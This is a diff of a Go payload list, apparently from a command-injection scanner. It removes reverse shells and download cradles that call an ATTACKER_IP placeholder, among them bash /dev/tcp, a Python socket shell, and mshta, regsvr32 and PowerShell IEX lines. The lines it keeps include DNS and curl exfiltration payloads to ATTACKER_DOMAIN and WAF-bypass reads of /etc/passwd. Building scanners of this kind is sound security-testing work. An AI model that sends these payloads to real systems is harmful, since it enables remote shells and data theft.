@@ -125,12 +125,10 @@ var linuxPayloads = []Payload{
 	{Value: "`sleep 5`", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Backtick sleep"},
 	{Value: "$(sleep 5)", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Subshell sleep"},
 
-	// Reverse shells (for OOB testing)
-	{Value: ";bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", Platform: PlatformLinux, Type: TypeBlind, Description: "Bash reverse shell"},
-	{Value: ";curl http://ATTACKER_IP/$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "Curl exfiltration"},
-	{Value: ";wget http://ATTACKER_IP/$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "Wget exfiltration"},
-	{Value: ";ping -c 1 ATTACKER_IP", Platform: PlatformLinux, Type: TypeBlind, Description: "Ping callback"},
-	{Value: ";nslookup $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "DNS exfiltration"},
+	// OOB callbacks are handled by linuxOOBPayloads with ATTACKER_DOMAIN
+	// placeholders that the OOB-aware detector substitutes before sending.
+	// Reverse shells and download cradles with un-substituted ATTACKER_IP
+	// literals were removed — they reached the target verbatim and did nothing.
 
 	// WAF bypass Linux
 	{Value: ";c'a't /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Quote bypass cat", WAFBypass: true},
@@ -185,19 +183,10 @@ var windowsPayloads = []Payload{
 	{Value: "&cmd.exe /c whoami", Platform: PlatformWindows, Type: TypeChained, Description: "Full cmd path", WAFBypass: true},
 	{Value: "&%COMSPEC% /c whoami", Platform: PlatformWindows, Type: TypeChained, Description: "COMSPEC variable", WAFBypass: true},
 
-	// OOB testing Windows
-	{Value: "&nslookup %USERNAME%.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "DNS exfil username"},
-	{Value: "&powershell Invoke-WebRequest http://ATTACKER_IP/$env:USERNAME", Platform: PlatformWindows, Type: TypeBlind, Description: "PS HTTP exfil"},
-	{Value: "&certutil -urlcache -f http://ATTACKER_IP/test test.txt", Platform: PlatformWindows, Type: TypeBlind, Description: "Certutil callback"},
-
-	// --- HackTricks LOLBAS expansion ---
-	{Value: "&bitsadmin /transfer myJob /download /priority normal http://ATTACKER_IP/x.exe %TEMP%\\x.exe", Platform: PlatformWindows, Type: TypeBlind, Description: "bitsadmin file fetch (LOLBAS)"},
-	{Value: "&mshta http://ATTACKER_IP/x.hta", Platform: PlatformWindows, Type: TypeBlind, Description: "mshta HTA execution"},
-	{Value: "&regsvr32 /s /u /n /i:http://ATTACKER_IP/x.sct scrobj.dll", Platform: PlatformWindows, Type: TypeBlind, Description: "regsvr32 squiblydoo"},
-	{Value: "&rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\");", Platform: PlatformWindows, Type: TypeBlind, Description: "rundll32 JS RCE"},
+	// OOB testing Windows — only payloads that work without placeholder
+	// substitution. ATTACKER_IP/ATTACKER_DOMAIN-based payloads were removed;
+	// they reached the target verbatim and did nothing useful.
 	{Value: "&powershell -enc dwBoAG8AYQBtAGkA", Platform: PlatformWindows, Type: TypeChained, Description: "PowerShell base64-encoded command", WAFBypass: true},
-	{Value: "&powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/x.ps1')\"", Platform: PlatformWindows, Type: TypeBlind, Description: "PowerShell download cradle"},
-	{Value: "&for /f %i in ('whoami') do nslookup %i.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "for-loop DNS exfil result"},
 }
 
 // --- HackTricks / PayloadAllTheThings advanced expansion ---
@@ -216,14 +205,16 @@ var linuxBlindPayloads = []Payload{
 // networks because DNS resolution traverses different paths than HTTP.
 // ATTACKER_DOMAIN is a placeholder the detector substitutes before
 // sending.
+// linuxOOBPayloads use ATTACKER_DOMAIN as a placeholder the detector
+// substitutes with the interactsh/OOB callback host before sending.
+// Reverse shells with ATTACKER_IP were removed — they cannot be
+// substituted and reach the target as literal garbage.
 var linuxOOBPayloads = []Payload{
 	{Value: ";nslookup -type=A $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "DNS A-record exfil whoami"},
 	{Value: ";dig $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "dig DNS exfil"},
 	{Value: ";host $(id|base64).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "host base64-id exfil"},
 	{Value: ";curl http://ATTACKER_DOMAIN/?u=$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "curl query-param exfil"},
 	{Value: ";wget http://ATTACKER_DOMAIN/$(id|base64)", Platform: PlatformLinux, Type: TypeBlind, Description: "wget exfil"},
-	{Value: ";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", Platform: PlatformLinux, Type: TypeBlind, Description: "Bash reverse shell"},
-	{Value: ";python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'", Platform: PlatformLinux, Type: TypeBlind, Description: "Python reverse shell"},
 }
 
 // Modern bash WAF bypass — brace expansion, ANSI-C quoting,
